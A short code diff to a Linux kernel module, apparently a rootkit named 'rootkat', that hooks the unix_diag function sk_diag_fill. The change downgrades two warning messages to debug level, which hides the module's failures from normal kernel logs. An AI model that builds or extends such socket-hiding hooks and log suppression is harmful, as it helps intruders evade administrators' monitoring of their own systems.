@@ -69,11 +69,11 @@ int rootkat_hook_unix_diag_install(void)
 	 * module_init time it isn't loaded; trigger autoload first. */
 	rc = request_module("unix_diag");
 	if (rc)
-		pr_warn(TAG "request_module(unix_diag) returned %d (continuing)\n", rc);
+		pr_debug(TAG "request_module(unix_diag) returned %d (continuing)\n", rc);
 
 	addr = rootkat_lookup_in_module("sk_diag_fill", "unix_diag");
 	if (!addr) {
-		pr_warn(TAG "sk_diag_fill not found in unix_diag\n");
+		pr_debug(TAG "sk_diag_fill not found in unix_diag\n");
 		return -ENOENT;
 	}
 
